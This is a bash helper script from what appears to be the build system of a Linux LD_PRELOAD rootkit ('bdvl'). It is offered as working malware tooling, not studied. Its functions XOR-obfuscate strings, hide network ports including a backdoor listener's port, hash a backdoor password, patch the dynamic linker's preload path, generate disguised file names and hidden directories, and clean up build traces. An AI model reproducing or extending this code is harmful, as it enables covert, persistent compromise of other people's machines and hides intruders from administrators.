script_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
default_depth=2 # default depth for getting random directory paths for stuff

random(){ echo -n "`cat /dev/urandom | tr -dc $1 | fold -w $2 | head -n 1`"; }
bin_path(){ echo -n `which $1 2>/dev/null || echo -n "$(random 'a-z' 5)"`; }
get_rand_path(){ echo -n "$($script_root/get_rand_path.sh $default_depth)/.$RANDOM"; }
lib_size(){ echo -n "Rootkit compiled. ($BDVLSO.$1 - `ls -lhN $BDVLSO.$1 | awk '{print $5}'`)"; }
read_cfg(){ cat $1 | grep -o '^[^#]*'; }

source $script_root/dialog.sh
wecho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " \e[33m[!]\e[0m $1\n"; \
        return; \
    }
    show_msg "WARNING: $1"
}
eecho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " \e[31m[!]\e[0m $1\n"; \
        return; \
    }
    show_msg "ERROR: $1"
}
secho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " \e[32m[+]\e[0m $1\n"; \
        return; \
    }
    show_msg "$1"
}
necho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " [..] $1\n"; \
        return; \
    }
    show_info "$1"
}

asc() { printf '%d' "'$1"; }
xor(){
    local din ptr dout val1
    din="$1"
    for (( ptr=0; ptr<${#din}; ptr++ )); do
        val1=$(asc "${din:$ptr:1}")
        dout+=$(printf '\\\\x%02x' "$((val1 ^ $XKEY))")
    done
    printf '%s' "$dout"
}

get_hide_ports(){
    necho "Getting hidden ports"

    for i in ${!range_hide_ports[@]}; do
        local tmp+="${range_hide_ports[i]}-"
        if (( $i % 2 )); then
            HIDE_PORTS+=("${tmp::-1}")
            unset tmp
        fi
    done

    for port in ${HIDE_PORTS[@]}; do echo "$port" >> $NEW_MDIR/hide_ports; done
    [ `toggle_enabled USE_ACCEPT_BD` == "true" ] && \
        [ `toggle_enabled ACCEPT_USE_SSL` == "true" ] && \
            echo "$(( ACCEPT_PORT + 1 ))" >> $NEW_MDIR/hide_ports
}

crypt_password(){ # if we can use python3, use it. if not, use openssl.
    [ -f `bin_path python3` ] && { echo -n `python3 -c "import crypt; print(crypt.crypt(\"$1\"))"`; return; }
    echo -n "`openssl passwd -6 -salt `random 'A-Za-z0-9' 16` $1`"
}

patch_libdl(){
    necho "Patching dynamic linker libraries"
    LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"
}

get_rand_name(){
    local names name name_length
    names=(`read_cfg $script_root/names.txt`)
    name_length=6

    name=${names[$RANDOM % ${#names[@]}]}
    while [ ${#name} -gt $name_length ]; do name=${name::-1}; done
    while [ ${#name} -lt $name_length ]; do name+="`random 'a-z' 1`"; done

    echo -n "$name"
}

cleanup_bdvl() { necho "Cleaning up local mess"; rm -rf $NEW_MDIR *.so.*; }